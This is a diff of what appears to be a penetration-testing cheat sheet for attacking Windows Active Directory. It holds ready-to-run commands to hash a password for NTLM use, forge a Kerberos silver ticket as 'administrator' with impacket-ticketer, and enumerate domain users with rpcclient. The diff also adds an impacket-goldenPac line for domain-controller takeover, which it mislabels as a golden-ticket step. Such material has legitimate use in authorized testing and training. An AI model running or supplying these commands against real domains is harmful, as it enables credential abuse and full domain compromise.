@@ -816,6 +816,10 @@ echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | 
 -->> Create Ticket
 cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; export KRB5CCNAME=`pwd`/administrator.ccache
 
++---------- Golden Ticket ----------+
+impacket-goldenPac -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$DC
+
+
 [*] (135) RPC
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "enumdomusers"
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "lsaquery"
